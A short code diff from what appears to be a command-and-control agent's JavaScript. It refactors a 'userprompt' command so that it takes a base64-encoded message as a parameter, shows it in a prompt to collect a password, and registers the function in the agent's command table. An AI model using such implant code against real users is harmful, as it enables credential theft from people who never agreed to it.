@@ -1,5 +1,5 @@
-userprompt = function() {
-    let txt = atob(data['data']);
+userprompt = function(params) {
+    let txt = atob(params);
     let ans = [];
     let pass = prompt(txt);
     if (pass != null){
@@ -18,3 +18,4 @@ userprompt = function() {
 };
 
 C2.commands[userprompt.name] = userprompt;
+
